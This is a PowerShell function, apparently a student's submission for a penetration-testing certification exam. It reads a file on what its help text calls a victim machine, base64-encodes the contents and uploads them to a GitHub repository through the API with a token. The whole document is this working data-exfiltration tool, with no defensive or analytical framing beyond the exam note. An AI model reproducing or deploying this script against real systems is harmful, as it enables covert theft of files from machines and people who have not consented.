function Exfiltrate
{ 
<#
.SYNOPSIS
A PowerShell script that use the GitHub API for exfltrate data from a victem machien to github .

.DESCRIPTION A PowerShell script that use the GitHub API for exfltrate data from a victem machien to github, using encoding base64   .

.PARAMTER token
genreted by github.

.PARAMTER URIgit
this is the link for the repo .

.PARAMTER commitMessage
The commit message.

.PARAMTER committerName
The author of the commit.

.PARAMTER committerEmail
The email of the author of the commit.

.EXAMPLE
PS C:\> . .\Exfiltrate
PS C:\> Exfiltrate -token *************************  -URIgit /https://api.github.com/repos/username/repo/contents/command.txt -file C:\users\user\1.txt
.LINK
https://developer.github.com/v3/repos/contents/
https://github.com/blog/1509-personal-api-tokens

.NOTES
This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
Student ID:3270
#>
[CmdletBinding()] Param( 

    [Parameter(Mandatory = $true)]
    [String]
    $token ,
       [Parameter(Mandatory = $true)]
       [String]
       $URIgit,
       [Parameter(Mandatory = $true)]
       [String]
       $file ,
       [Parameter(Mandatory = $false)]
       [String]
       $crMessage = "test",

       [Parameter(Mandatory = $false)]
       [String]
       $crName = 'name',

       [Parameter(Mandatory = $false)]
       [String]
       $crEmail = "defult@defult.com"
    )

        #get the content of the file and encode it as base64
            $Fileq = Get-Content $file
            $conv = [System.Text.Encoding]::UTF8.GetBytes($Fileq)
            $relconv = [System.Convert]::ToBase64String($conv)
            # prepare the request to send to github 
            $auth = @{"Authorization"="token $token"}
            $committer = @{"name"=$crName; "email"=$crEmail}
            $data = @{"message"=$crMessage; "committer"=$committer; "content"=$relconv }
            $jsonData = ConvertTo-Json $data
            # sending the request with the content of the data
            $req = Invoke-WebRequest -Headers $auth -Method PUT -Body $JsonData -Uri $URIgit -UseBasicParsing
            if ($req.StatusCode -eq 201){
                write-host "File uploaded succesfully!" -ForegroundColor Green
            }
            else {
                write-host "Error" -ForegroundColor Red
        }


        
}
